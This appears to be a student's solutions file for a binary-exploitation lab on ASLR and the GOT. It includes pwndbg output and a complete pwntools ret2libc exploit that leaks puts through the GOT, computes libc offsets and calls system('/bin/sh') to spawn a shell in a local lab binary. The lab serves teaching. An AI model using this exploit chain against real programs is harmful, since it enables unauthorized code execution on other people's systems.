# Laborator 4

### [Q1]: Knowing the interesting property above, what would be a weakness of ASLR?
### Solution to [Q1]:
The weakness of ASLR is that once we obtain the location of any function or instruction, we can infer the positions of all other functions and data segments relative to that known point (the offsets remain the same, only the base address of of a module changes).

## Exercise 1

### [Q2]: Are there interesting functions you can jump to? Check out the full disassembly with `objdump -M intel -d ./bin/ex1`.
### Solution to [Q2]:
`power` : it allows us to control register values and execute arithmetic operations.

### [Q3]: Try the `got` command in `pwndbg` and `gef`. It will show you the contents of the GOT section. At the beginning of the binary, the imported functions should point to executable stubs in the binary that trigger the linker. After executing the imported functions once, the GOT section should contain their real, libc address.
### Solution to [Q3]:
```python
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/radu/osds-lab/lab4/bin/ex1:
GOT protection: Partial RELRO | Found 2 GOT entries passing the filter
[0x404000] puts@GLIBC_2.2.5 -> 0x7ffff7e2cbd0 (puts) ◂— endbr64
[0x404008] gets@GLIBC_2.2.5 -> 0x7ffff7e2c070 (gets) ◂— endbr64
```

### [Q4]: So the GOT contains addresses from inside imported libraries. How can we exploit this?
### Solution to [Q4]:
Leak address of `puts` -> Leak address of `libc` -> Find offsets for `/bin/sh`, `system`.

## Solution to Exercise 1: 
```python
from pwn import *

context.binary = elf = ELF('./bin/ex1')
p = process()
p.recvline()

# cyclic -l ...
padding = 40

# ropper --file ./bin/ex1 --search "pop rdi"
# 0x0000000000401193: pop rdi; pop rbp; ret;
pop_rdi = 0x0000000000401193

puts = elf.sym.puts

payload = flat(
        b'A' * padding,
        pop_rdi,
        elf.got.puts,
        0xdeadbeef,
        puts,
        elf.sym.main,
)
p.sendline(payload)

puts_base = unpack(p.recvlines(2)[1], 'all')
libc_base = puts_base - 0x0000000000087bd0

# strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep -i /bin/sh
binsh = libc_base + 0x1cb42f


# 0x000000000040101a: ret
ret = 0x000000000040101a

# objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep -i system
system = libc_base + 0x0000000000058740

payload = flat(
        b'A' * padding,
        pop_rdi,
        binsh,
        0xdeadbeef,
        ret,
        system,
)

p.sendline(payload)
p.interactive()
```

## Exercise 2



